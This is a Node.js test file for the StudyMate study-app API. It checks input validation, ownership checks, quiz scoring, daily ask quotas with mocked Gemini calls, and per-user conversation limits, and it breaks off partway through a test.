const path = require('path');
const dotenv = require('dotenv');

// Load environment variables before resolving database URI
dotenv.config({ path: path.resolve(__dirname, '../../.env') });

const { describe, it, before, after, beforeEach, afterEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const { connectDB, disconnectDB } = require('../config/db');
const { getJwtSecret } = require('../config/jwt');
const User = require('../models/User');
const Note = require('../models/Note');
const QuizResult = require('../models/QuizResult');
const AskUsage = require('../models/AskUsage');
const GlobalImageUsage = require('../models/GlobalImageUsage');
const Conversation = require('../models/Conversation');
const geminiConfig = require('../config/gemini');
const { getKolkataDateString, isImageGenerationRequest, isSvgDiagramRequest, getImageProvider, MAX_STORED_SVG_BYTES } = require('../controllers/askController');
const { generateGeminiImage, ImageGenError } = require('../utils/geminiImage');
const { generateCloudflareImage, stripTextAndLabelRequests, NO_TEXT_INSTRUCTION } = require('../utils/cloudflareImage');
const { sanitizeSvg, MAX_SVG_BYTES } = require('../utils/svgSanitizer');

process.env.PORT = '5001';

// ============================================================================
// Safe Test Database Resolution
// Never use MONGODB_URI directly. Read MONGODB_TEST_URI or force "studymate_test".
// Refuse to run if database name is not "studymate_test".
// ============================================================================
function resolveTestUri() {
  if (process.env.MONGODB_TEST_URI) {
    return process.env.MONGODB_TEST_URI;
  }

  const rawUri = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/studymate';
  const match = rawUri.match(/^(mongodb(?:\+srv)?:\/\/[^/]+)(?:\/([^?]*))?(\?.*)?$/);
  if (match) {
    const base = match[1];
    const query = match[3] || '';
    return `${base}/studymate_test${query}`;
  }

  return 'mongodb://127.0.0.1:27017/studymate_test';
}

const testMongoUri = resolveTestUri();

// Override MONGODB_URI for test execution so no component connects to production
process.env.MONGODB_URI = testMongoUri;

// Verify URI targets "studymate_test"
const uriMatch = testMongoUri.match(/^mongodb(?:\+srv)?:\/\/[^/]+\/([^?]+)/);
const targetDatabaseName = uriMatch ? uriMatch[1] : null;

if (targetDatabaseName !== 'studymate_test') {
  throw new Error(
    `SAFETY REFUSAL: Target database is "${targetDatabaseName}". Tests are strictly forbidden from running on any database other than "studymate_test". Aborting test suite.`
  );
}

const app = require('../index');

describe('StudyMate API', () => {
  let server;
  let user1;
  let user2;
  let authUser1;
  let authUser2;
  let user1Note;
  let user2Note;

  before(async () => {
    await connectDB(testMongoUri);

    // Verify active Mongoose connection is strictly "studymate_test"
    const connectedDbName = mongoose.connection.name || mongoose.connection.db?.databaseName;
    if (connectedDbName !== 'studymate_test') {
      await disconnectDB();
      throw new Error(
        `SAFETY REFUSAL: Connected database is "${connectedDbName}". Tests must ONLY run on "studymate_test". Aborting tests.`
      );
    }

    server = app.listen(5001);

    // Create test users for authentication in studymate_test
    user1 = await User.create({
      name: 'Test Student One',
      email: `student1_${Date.now()}@test.edu`,
      password: 'password123',
    });
    authUser1 = `Bearer ${jwt.sign({ id: user1._id }, getJwtSecret(), { expiresIn: '1h' })}`;

    user2 = await User.create({
      name: 'Test Student Two',
      email: `student2_${Date.now()}@test.edu`,
      password: 'password123',
    });
    authUser2 = `Bearer ${jwt.sign({ id: user2._id }, getJwtSecret(), { expiresIn: '1h' })}`;

    user1Note = await Note.create({
      user: user1._id,
      title: 'Operating Systems - Processes',
      rawContent: 'Process states, scheduling queues, PCB structure, context switching.',
    });

    user2Note = await Note.create({
      user: user2._id,
      title: 'Database Management Systems - ACID',
      rawContent: 'Atomicity, Consistency, Isolation, Durability.',
    });
  });

  after(async () => {
    try {
      if (server) {
        await new Promise((resolve) => server.close(resolve));
      }

      // Drop the test database after the suite finishes
      if (mongoose.connection.readyState === 1 && mongoose.connection.name === 'studymate_test') {
        console.log('[Test Cleanup] Dropping test database "studymate_test"...');
        await mongoose.connection.db.dropDatabase();
        console.log('[Test Cleanup] Test database "studymate_test" dropped successfully.');
      }
    } finally {
      await disconnectDB();
    }
  });

  // ==========================================
  // Database Safety Verification
  // ==========================================
  describe('Database Safety Verification', () => {
    it('confirms the active database connection is strictly "studymate_test"', () => {
      assert.equal(mongoose.connection.name, 'studymate_test');
    });

    it('refuses to run if database name is not "studymate_test"', () => {
      const verifySafety = (dbName) => {
        if (dbName !== 'studymate_test') {
          throw new Error(`SAFETY REFUSAL: Database "${dbName}" is not "studymate_test".`);
        }
      };
      assert.throws(() => verifySafety('studymate'), /SAFETY REFUSAL/);
      assert.throws(() => verifySafety('production_db'), /SAFETY REFUSAL/);
      assert.doesNotThrow(() => verifySafety('studymate_test'));
    });
  });

  // ==========================================
  // ITEM 1: authController Validation
  // ==========================================
  describe('1. authController Validation', () => {
    it('1.1 rejects non-string name with 400', async () => {
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 12345, email: 'valid@test.edu', password: 'password123' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /strings/i);
    });

    it('1.2 rejects non-string email with 400', async () => {
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Student Name', email: { email: 'bad' }, password: 'password123' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /strings/i);
    });

    it('1.3 rejects non-string password with 400', async () => {
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Student Name', email: 'valid@test.edu', password: ['secret'] });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /strings/i);
    });

    it('1.4 rejects invalid email format with regex check (400, not 500)', async () => {
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Student Name', email: 'invalid-email-format', password: 'password123' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /valid email/i);
    });

    it('1.5 rejects password under 8 characters with 400', async () => {
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Student Name', email: 'valid@test.edu', password: 'short' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /between 8 and 72/i);
    });

    it('1.6 rejects password over 72 characters with 400 (bcrypt limit)', async () => {
      const longPassword = 'P'.repeat(73);
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Student Name', email: 'valid@test.edu', password: longPassword });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /between 8 and 72/i);
    });

    it('1.7 successfully registers with valid parameters within 8-72 char limit', async () => {
      const email = `newstudent_${Date.now()}@test.edu`;
      const res = await request(server)
        .post('/api/auth/register')
        .send({ name: 'Valid Student', email, password: 'securePassword123' });
      assert.equal(res.status, 201);
      assert.ok(res.body.token);
      assert.equal(res.body.user.email, email);
    });
  });

  // ==========================================
  // ITEM 2: validateObjectId Middleware
  // ==========================================
  describe('2. validateObjectId Middleware (:id and :noteId)', () => {
    it('2.1 returns 400 "Invalid id" on notes routes (GET /api/notes/:id)', async () => {
      const res = await request(server)
        .get('/api/notes/invalid-mongo-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.2 returns 400 "Invalid id" on note summarize (POST /api/notes/:id/summarize)', async () => {
      const res = await request(server)
        .post('/api/notes/invalid-mongo-id/summarize')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.3 returns 400 "Invalid id" on note delete (DELETE /api/notes/:id)', async () => {
      const res = await request(server)
        .delete('/api/notes/invalid-mongo-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.4 returns 400 "Invalid id" on flashcards route (GET /api/flashcards/note/:noteId)', async () => {
      const res = await request(server)
        .get('/api/flashcards/note/invalid-note-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.5 returns 400 "Invalid id" on questions route (GET /api/questions/note/:noteId)', async () => {
      const res = await request(server)
        .get('/api/questions/note/invalid-note-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.6 returns 400 "Invalid id" on planner routes (GET /api/planner/:id)', async () => {
      const res = await request(server)
        .get('/api/planner/invalid-plan-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.7 returns 400 "Invalid id" on planner toggle-task (PATCH /api/planner/:id/toggle-task)', async () => {
      const res = await request(server)
        .patch('/api/planner/invalid-plan-id/toggle-task')
        .set('Authorization', authUser1)
        .send({ dayIndex: 0, taskIndex: 0 });
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.8 returns 400 "Invalid id" on quiz result route (GET /api/quiz/result/:id)', async () => {
      const res = await request(server)
        .get('/api/quiz/result/invalid-quiz-result-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.9 returns 400 "Invalid id" on conversation get (GET /api/ask/conversations/:id)', async () => {
      const res = await request(server)
        .get('/api/ask/conversations/invalid-conv-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.10 returns 400 "Invalid id" on conversation rename (PATCH /api/ask/conversations/:id)', async () => {
      const res = await request(server)
        .patch('/api/ask/conversations/invalid-conv-id')
        .set('Authorization', authUser1)
        .send({ title: 'New Title' });
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });

    it('2.11 returns 400 "Invalid id" on conversation delete (DELETE /api/ask/conversations/:id)', async () => {
      const res = await request(server)
        .delete('/api/ask/conversations/invalid-conv-id')
        .set('Authorization', authUser1);
      assert.equal(res.status, 400);
      assert.equal(res.body.message, 'Invalid id');
    });
  });

  // ==========================================
  // ITEM 3: quizController.saveQuizResult
  // ==========================================
  describe('3. quizController.saveQuizResult', () => {
    it('3.1 requires 1 to 50 questions (rejects 0 questions with 400)', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({ questions: [] });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /1 to 50/i);
    });

    it('3.2 requires 1 to 50 questions (rejects 51 questions with 400)', async () => {
      const questions51 = Array(51).fill({
        question: 'Sample Question',
        options: ['Opt 1', 'Opt 2'],
        correctAnswer: 'Opt 1',
        userAnswer: 'Opt 1',
        isCorrect: true,
      });
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({ questions: questions51 });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /1 to 50/i);
    });

    it('3.3 ignores client-sent score, computes score from isCorrect, sets totalQuestions to questions.length', async () => {
      const questions = [
        { question: 'Q1', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
        { question: 'Q2', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'B', isCorrect: false },
        { question: 'Q3', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
        { question: 'Q4', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'B', isCorrect: false },
      ];

      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          score: 99, // Should be ignored!
          totalQuestions: 100, // Should be ignored and recomputed to 4!
          questions,
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.score, 2, 'Score must be computed from questions[].isCorrect (2 true out of 4)');
      assert.equal(res.body.totalQuestions, 4, 'totalQuestions must equal questions.length');
      assert.equal(res.body.percentage, 50, 'Percentage must be (2 / 4) * 100 = 50');
    });

    it('3.4 verifies noteId (if sent) belongs to user (rejects noteId belonging to another user with 404)', async () => {
      const questions = [
        { question: 'Q1', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
      ];

      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          noteId: user2Note._id, // Belongs to user2, not user1
          questions,
        });

      assert.equal(res.status, 404);
      assert.match(res.body.message, /belong/i);
    });

    it('3.5 succeeds when noteId belongs to the authenticated user', async () => {
      const questions = [
        { question: 'Q1', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
      ];

      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          noteId: user1Note._id,
          questions,
        });

      assert.equal(res.status, 201);
      assert.equal(res.body.score, 1);
      assert.equal(res.body.totalQuestions, 1);
      assert.equal(res.body.percentage, 100);
      assert.ok(res.body.resultId);
    });

    it('3.6 rejects non-object items in questions with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: ['not-an-object'],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.7 rejects question item with missing or non-string question with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 123, options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.8 rejects question item with missing or non-string correctAnswer with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: null, userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.9 rejects question item with missing or non-string userAnswer with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 42, isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.10 rejects question item with non-array options with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 'What is OS?', options: 'A, B', correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.11 rejects question item with non-string elements in options with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 'What is OS?', options: ['A', 2], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.12 rejects question item with missing or non-boolean isCorrect with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: 'true' },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Every question must be an object/i);
    });

    it('3.13 rejects non-string noteTitle with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          noteTitle: { title: 'Invalid' },
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /noteTitle must be a string/i);
    });

    it('3.14 rejects noteTitle longer than 200 characters with 400', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          noteTitle: 'A'.repeat(201),
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /noteTitle must be a string up to 200 characters/i);
    });

    it('3.15 accepts valid noteTitle up to 200 characters and saves result', async () => {
      const res = await request(server)
        .post('/api/quiz/save-result')
        .set('Authorization', authUser1)
        .send({
          noteTitle: 'Valid Short Title (under 200 chars)',
          questions: [
            { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
          ],
        });
      assert.equal(res.status, 201);
      assert.ok(res.body.resultId);
    });

    it('3.16 returns 400 on Mongoose ValidationError in catch block', async () => {
      const mockCreate = mock.method(QuizResult, 'create', async () => {
        const err = new Error('Schema validation error occurred');
        err.name = 'ValidationError';
        throw err;
      });
      try {
        const res = await request(server)
          .post('/api/quiz/save-result')
          .set('Authorization', authUser1)
          .send({
            questions: [
              { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
            ],
          });
        assert.equal(res.status, 400);
        assert.match(res.body.message, /Schema validation error/i);
      } finally {
        mockCreate.mock.restore();
      }
    });

    it('3.17 returns 400 on Mongoose CastError in catch block', async () => {
      const mockCreate = mock.method(QuizResult, 'create', async () => {
        const err = new Error('Cast to ObjectId failed');
        err.name = 'CastError';
        throw err;
      });
      try {
        const res = await request(server)
          .post('/api/quiz/save-result')
          .set('Authorization', authUser1)
          .send({
            questions: [
              { question: 'What is OS?', options: ['A', 'B'], correctAnswer: 'A', userAnswer: 'A', isCorrect: true },
            ],
          });
        assert.equal(res.status, 400);
        assert.match(res.body.message, /Cast to ObjectId failed/i);
      } finally {
        mockCreate.mock.restore();
      }
    });
  });

  // ==========================================
  // 4. Unknown /api Routes JSON 404 Handler
  // ==========================================
  describe('4. Unknown /api Routes JSON 404 Handler', () => {
    it('4.1 returns JSON 404 for unknown GET /api route', async () => {
      const res = await request(server).get('/api/unknown-endpoint-test');
      assert.equal(res.status, 404);
      assert.deepEqual(res.body, { error: true, message: 'Route not found' });
    });

    it('4.2 returns JSON 404 for unknown POST /api route', async () => {
      const res = await request(server)
        .post('/api/completely/unknown/route')
        .send({ test: true });
      assert.equal(res.status, 404);
      assert.deepEqual(res.body, { error: true, message: 'Route not found' });
    });

    it('4.3 returns JSON 404 for unhandled subroute under /api/notes', async () => {
      const res = await request(server)
        .get('/api/notes/nonexistent/subroute/path')
        .set('Authorization', authUser1);
      assert.equal(res.status, 404);
      assert.deepEqual(res.body, { error: true, message: 'Route not found' });
    });
  });

  // ==========================================
  // 5. Ask AI (POST /api/ask)
  // ==========================================
  describe('5. Ask AI (POST /api/ask)', () => {
    it('5.1 returns 401 without authorization token', async () => {
      const res = await request(server)
        .post('/api/ask')
        .send({ question: 'What is scheduling in OS?', mode: 'doubt' });
      assert.equal(res.status, 401);
    });

    it('5.2 returns 400 for non-string question', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: 12345, mode: 'doubt' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /string/i);
    });

    it('5.3 returns 400 for question too short (< 3 characters)', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: 'hi', mode: 'doubt' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /between 3 and 2000/i);
    });

    it('5.4 returns 400 for question too long (> 2000 characters)', async () => {
      const longQuestion = 'a'.repeat(2001);
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: longQuestion, mode: 'doubt' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /between 3 and 2000/i);
    });

    it('5.5 returns 400 for unknown/invalid mode', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: 'Explain virtual memory', mode: 'invalid_mode_xyz' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Invalid mode/i);
    });

    it('5.6 returns 400 for invalid noteId format', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: 'Explain paging', mode: 'mark2', noteId: 'not-a-valid-objectid' });
      assert.equal(res.status, 400);
      assert.match(res.body.message, /Invalid noteId format/i);
    });

    it('5.7 returns 404 for noteId belonging to another user', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({
          question: 'What is ACID in DBMS?',
          mode: 'mark2',
          noteId: user2Note._id.toString(),
        });
      assert.equal(res.status, 404);
      assert.match(res.body.message, /not found or does not belong to you/i);
    });

    it('5.8 returns 503 when AI client is missing without leaking GEMINI_API_KEY', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => null);
      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({ question: 'What is process synchronization?', mode: 'doubt' });
        assert.equal(res.status, 503);
        assert.match(res.body.message, /AI service is temporarily unavailable/i);
        assert.doesNotMatch(res.body.message, /GEMINI_API_KEY/i);
      } finally {
        mockGetClient.mock.restore();
      }
    });

    it('5.9 returns 429 when user has reached daily cap of 40 asks (Asia/Kolkata date)', async () => {
      const today = getKolkataDateString();
      // Seed user1's AskUsage to 40 for today
      await AskUsage.findOneAndUpdate(
        { user: user1._id, date: today },
        { count: 40 },
        { upsert: true, new: true }
      );

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({ question: 'What is thrashing in OS?', mode: 'mark2' });

      assert.equal(res.status, 429);
      assert.match(res.body.message, /Daily ask limit reached/i);

      // Clean up for subsequent tests
      await AskUsage.deleteOne({ user: user1._id, date: today });
    });

    it('5.10 returns 200 with answer, mode, and truncated when successful with user note', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'A process is an instance of a program execution in memory with code, data, and PCB.'
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'What is a process based on my notes?',
            mode: 'mark2',
            noteId: user1Note._id.toString(),
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.mode, 'mark2');
        assert.equal(typeof res.body.answer, 'string');
        assert.ok(res.body.answer.length > 0);
        assert.equal(res.body.truncated, false);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('5.11 resolves auto mode from model tag "[MODE: mark8]" correctly', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => '[MODE: mark8]\n### Overview\nHere is an 8-mark structured answer with points.'
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'Give me a detailed answer about scheduling algorithms.',
            mode: 'auto',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.mode, 'mark8');
        assert.ok(!res.body.answer.startsWith('[MODE:'));
        assert.match(res.body.answer, /### Overview/);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('5.12 atomically restricts parallel requests when 38 asks are already used (at most 2 may pass)', async () => {
      const today = getKolkataDateString();
      await AskUsage.findOneAndUpdate(
        { user: user1._id, date: today },
        { count: 38 },
        { upsert: true, new: true }
      );

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'Atomic concurrency answer.'
      );

      try {
        // Send 5 parallel requests
        const requests = Array.from({ length: 5 }, (_, i) =>
          request(server)
            .post('/api/ask')
            .set('Authorization', authUser1)
            .send({ question: `Concurrent test question ${i + 1}`, mode: 'mark2' })
        );

        const responses = await Promise.all(requests);
        const passedResponses = responses.filter((r) => r.status === 200);
        const rateLimitedResponses = responses.filter((r) => r.status === 429);

        // Requirement: at most 2 may pass
        assert.ok(passedResponses.length <= 2, `Expected at most 2 to pass, got ${passedResponses.length}`);
        assert.equal(passedResponses.length, 2, 'Exactly 2 slots remained from 38 to 40');
        assert.equal(rateLimitedResponses.length, 3, 'Remaining 3 requests must be 429 rate limited');

        const finalUsage = await AskUsage.findOne({ user: user1._id, date: today });
        assert.equal(finalUsage.count, 40);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
        await AskUsage.deleteOne({ user: user1._id, date: today });
      }
    });

    it('5.13 decrements reserved slot when Gemini fails so student quota is preserved', async () => {
      const today = getKolkataDateString();
      await AskUsage.findOneAndUpdate(
        { user: user1._id, date: today },
        { count: 15 },
        { upsert: true, new: true }
      );

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => {
          throw new Error('Gemini upstream network error');
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({ question: 'Explain TCP handshake', mode: 'doubt' });

        assert.equal(res.status, 503);
        const usage = await AskUsage.findOne({ user: user1._id, date: today });
        assert.equal(usage.count, 15, 'Reserved slot must be rolled back on failure');
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
        await AskUsage.deleteOne({ user: user1._id, date: today });
      }
    });

    it('5.14 guarantees answer returned in auto mode never contains "[MODE:"', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => '[MODE: simple]\nThis is a beginner-friendly explanation of stacks and queues.'
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'Explain stacks simply',
            mode: 'auto',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.mode, 'simple');
        assert.equal(res.body.answer.includes('[MODE:'), false, 'Answer must never contain "[MODE:"');
        assert.doesNotMatch(res.body.answer, /\[MODE:/i);
        assert.match(res.body.answer, /beginner-friendly explanation/);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });
  });

  // ==========================================
  // ITEM 6: Ask AI Saved Conversation History
  // ==========================================
  describe('6. Ask AI Saved Conversation History', () => {
    let convUser1;

    beforeEach(async () => {
      await Conversation.deleteMany({});

      convUser1 = await Conversation.create({
        user: user1._id,
        title: 'Initial User1 Conversation',
        messages: [
          {
            role: 'user',
            content: 'What is an operating system kernel?',
            mode: 'doubt',
            createdAt: new Date(),
          },
          {
            role: 'assistant',
            content: 'The kernel is the core component of an operating system.',
            mode: 'doubt',
            createdAt: new Date(),
          },
        ],
      });
    });

    afterEach(async () => {
      await Conversation.deleteMany({});
    });

    it('6.1 user B gets 404 for user A conversation on GET /api/ask/conversations/:id', async () => {
      const res = await request(server)
        .get(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser2);

      assert.equal(res.status, 404);
      assert.match(res.body.message, /not found/i);
    });

    it('6.2 user B gets 404 for user A conversation on PATCH /api/ask/conversations/:id', async () => {
      const res = await request(server)
        .patch(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser2)
        .send({ title: 'Hacked Title By User 2' });

      assert.equal(res.status, 404);
      assert.match(res.body.message, /not found/i);
    });

    it('6.3 user B gets 404 for user A conversation on DELETE /api/ask/conversations/:id', async () => {
      const res = await request(server)
        .delete(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser2);

      assert.equal(res.status, 404);
      assert.match(res.body.message, /not found/i);

      // Verify User A conversation still exists in database
      const existing = await Conversation.findById(convUser1._id);
      assert.ok(existing);
    });

    it('6.4 user B gets 404 when sending user A conversationId to POST /api/ask', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser2)
        .send({
          question: 'Can I access this chat?',
          mode: 'doubt',
          conversationId: convUser1._id.toString(),
        });

      assert.equal(res.status, 404);
      assert.match(res.body.message, /not found/i);
    });

    it('6.5 generates title from first 60 chars of question on new conversation and returns conversationId', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'Virtual memory maps virtual addresses to physical RAM using page tables.'
      );

      const longQuestion = 'Explain how virtual memory paging and page tables work in modern 64-bit operating systems in detail';
      const expectedTitle = longQuestion.slice(0, 60);

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: longQuestion,
            mode: 'mark8',
          });

        assert.equal(res.status, 200);
        assert.ok(res.body.conversationId);
        assert.equal(res.body.mode, 'mark8');
        assert.match(res.body.answer, /virtual memory/i);

        const savedConv = await Conversation.findById(res.body.conversationId);
        assert.ok(savedConv);
        assert.equal(savedConv.title, expectedTitle);
        assert.equal(savedConv.title.length, 60);
        assert.equal(savedConv.messages.length, 2);
        assert.equal(savedConv.messages[0].role, 'user');
        assert.equal(savedConv.messages[0].content, longQuestion);
        assert.equal(savedConv.messages[1].role, 'assistant');
        assert.equal(savedConv.messages[1].content, res.body.answer);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('6.6 enforces 30-conversation limit per user (returns 400 telling user to delete one)', async () => {
      await Conversation.deleteMany({ user: user1._id });
      const seedConversations = Array.from({ length: 30 }, (_, i) => ({
        user: user1._id,
        title: `Conversation ${i + 1}`,
        messages: [{ role: 'user', content: `Q ${i + 1}`, createdAt: new Date() }],
      }));
      await Conversation.insertMany(seedConversations);

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({
          question: 'Will this 31st conversation be blocked?',
          mode: 'doubt',
        });

      assert.equal(res.status, 400);
      assert.match(res.body.message, /30/);
      assert.match(res.body.message, /delete/i);
    });

    it('6.7 enforces 40-message limit per conversation (returns 400 asking to start new chat)', async () => {
      const fullMessages = Array.from({ length: 40 }, (_, i) => ({
        role: i % 2 === 0 ? 'user' : 'assistant',
        content: `Message content ${i + 1}`,
        createdAt: new Date(),
      }));

      const fullConv = await Conversation.create({
        user: user1._id,
        title: 'Conversation With 40 Messages',
        messages: fullMessages,
      });

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({
          question: 'Can I add a 41st message to this chat?',
          mode: 'doubt',
          conversationId: fullConv._id.toString(),
        });

